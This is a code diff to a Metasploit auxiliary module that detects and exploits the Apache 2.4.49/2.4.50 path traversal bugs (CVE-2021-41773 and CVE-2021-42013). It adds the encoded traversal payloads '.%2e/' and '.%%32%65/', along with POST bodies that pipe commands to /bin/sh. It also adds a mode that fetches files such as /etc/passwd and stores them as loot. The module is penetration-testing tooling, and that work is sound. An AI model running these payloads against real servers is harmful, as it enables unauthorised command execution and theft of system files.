@@ -12,16 +12,21 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Apache 2.4.49 Traversal RCE scanner',
+        'Name' => 'Apache 2.4.49/2.4.50 Traversal RCE scanner',
         'Description' => %q{
           This module scan for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
           If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
           it can be used to execute arbitrary commands (Remote Command Execution).
+          This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).
         },
         'References' => [
           ['CVE', '2021-41773'],
+          ['CVE', '2021-42013'],
           ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
-          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse']
+          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse'],
+          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml'],
+          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74'],
+          ['URL', 'https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis']
         ],
         'Author' => [
           'Ash Daulton', # Vulnerability discovery
@@ -34,28 +39,35 @@ class MetasploitModule < Msf::Auxiliary
           'RPORT' => 443,
           'SSL' => true
         },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        },
         'Actions' => [
           [
-            'Traversal', {
-              'Description' => 'Basic scanner for CVE-2021-41773 when mod_cgi is disabled.'
+            'Apache 2.4.49',
+            {
+              'Description' => 'Payload for Apache 2.4.49',
+              'CVE' => 'CVE-2021-41773',
+              'Payload' => '.%2e/'
             }
           ],
           [
-            'RCE', {
-              'Description' => 'Basic scanner for CVE-2021-41773 when mod_cgi is enabled.'
-            }
-          ],
-          [
-            'Read', {
-              'Description' => 'Exploit for CVE-2021-41773 to read local file on the remote server.'
+            'Apache 2.4.49 and 2.4.50',
+            {
+              'Description' => 'Payload for Apache 2.4.49 and 2.4.50',
+              'CVE' => 'CVE-2021-42013',
+              'Payload' => '.%%32%65/'
             }
           ]
         ],
-        'DefaultAction' => 'Traversal'
+        'DefaultAction' => 'Apache 2.4.49 and 2.4.50'
       )
     )
 
     register_options([
+      OptEnum.new('StartMode', [true, 'Start mode.', 'Traversal', [ 'Traversal', 'RCE', 'Read']]),
       OptString.new('FILEPATH', [false, 'File you want to read', '/etc/passwd']),
       OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin']),
       OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5])
@@ -68,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def exec_traversal(cmd)
     send_request_raw({
-      'method' => 'POST',
+      'method' => Rex::Text.rand_text_alpha(3..4),
       'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s),
       'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{cmd}"
     })
@@ -77,16 +89,18 @@ class MetasploitModule < Msf::Auxiliary
   def read_traversal
     send_request_raw({
       'method' => 'GET',
-      'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s)
+      'uri' => normalize_uri(@target_uri, @traversal.to_s)
     })
   end
 
   def run_host(ip)
     @proto = (ssl ? 'https' : 'http')
 
-    case action.name
+    case datastore['StartMode']
     when /Traversal/
-      @traversal = '.%2e/'
+      @target_uri = Rex::Text.rand_text_alpha(4..8)
+      @traversal = action['Payload'] * datastore['DEPTH'] << '/etc/passwd'
+
       response = read_traversal
       unless response
         print_error(message('No response, target seems down.'))
@@ -94,18 +108,12 @@ class MetasploitModule < Msf::Auxiliary
         return Exploit::CheckCode::Unknown
       end
 
-      case response.code
-      when 200
-        print_good(message('The target is vulnerable to CVE-2021-41773 (mod_cgi disabled).'))
-      when 403
-        print_warning(message('The target is vulnerable to CVE-2021-41773 (mod_cgi disabled) - but the target path doen\'t exist).'))
-      when 500
-        print_good(message('The target is vulnerable to CVE-2021-41773 (mod_cgi enabled).'))
-      else
-        print_error(message('The target is not vulnerable to CVE-2021-41773.'))
+      if response.code != 403
+        print_error(message("The target is not vulnerable to #{action['CVE']}."))
 
         return Exploit::CheckCode::Safe
       end
+      print_good(message("The target is vulnerable to #{action['CVE']}."))
 
       vprint_status("Obtained HTTP response code #{response.code}.")
       report_vuln(
@@ -116,12 +124,18 @@ class MetasploitModule < Msf::Auxiliary
 
       return Exploit::CheckCode::Vulnerable
     when /RCE/
-      @traversal = '.%2e/' * datastore['DEPTH'] << '/bin/sh'
+      @traversal = action['Payload'] * datastore['DEPTH'] << '/bin/sh'
       rand_str = Rex::Text.rand_text_alpha(4..8)
 
       response = exec_traversal("echo #{rand_str}")
+      unless response
+        print_error(message('No response, target seems down.'))
+
+        return Exploit::CheckCode::Unknown
+      end
+
       if response.code == 200 && response.body.include?(rand_str)
-        print_good(message('The target is vulnerable to CVE-2021-41773 (mod_cgi enabled).'))
+        print_good(message("The target is vulnerable to #{action['CVE']} (mod_cgi enabled)."))
         report_vuln(
           host: target_host,
           name: name,
@@ -130,30 +144,43 @@ class MetasploitModule < Msf::Auxiliary
 
         return Exploit::CheckCode::Vulnerable
       end
-      print_error(message('The target is not vulnerable to CVE-2021-41773.'))
+      print_error(message("The target is not vulnerable to #{action['CVE']} (mod_cgi enabled)."))
 
       return Exploit::CheckCode::Safe
     when /Read/
       fail_with(Failure::BadConfig, 'File path option is empty!') if !datastore['FILEPATH'] || datastore['FILEPATH'].empty?
 
-      @traversal = '.%2e/' * datastore['DEPTH'] << datastore['FILEPATH']
+      @target_uri = datastore['TARGETURI']
+      @traversal = action['Payload'] * datastore['DEPTH'] << datastore['FILEPATH']
 
       response = read_traversal
-      unless response && response.code == 200
+      unless response
+        print_error(message('No response, target seems down.'))
+
+        return
+      end
+
+      if response.code == 500
+        print_warning(message("The target is vulnerable to #{action['CVE']} (mod_cgi enabled)."))
+      end
+
+      if response.code == 500 || response.body.empty?
         print_error('Nothing was downloaded')
 
         return
       end
 
-      vprint_good("#{peer} \n#{response.body}")
-      path = store_loot(
-        'apache.traversal',
-        'application/octet-stream',
-        ip,
-        response.body,
-        datastore['FILEPATH']
-      )
-      print_good("File saved in: #{path}")
+      if response.code == 200
+        vprint_good("#{peer} \n#{response.body}")
+        path = store_loot(
+          'apache.traversal',
+          'application/octet-stream',
+          ip,
+          response.body,
+          datastore['FILEPATH']
+        )
+        print_good("File saved in: #{path}")
+      end
     end
   end
 end
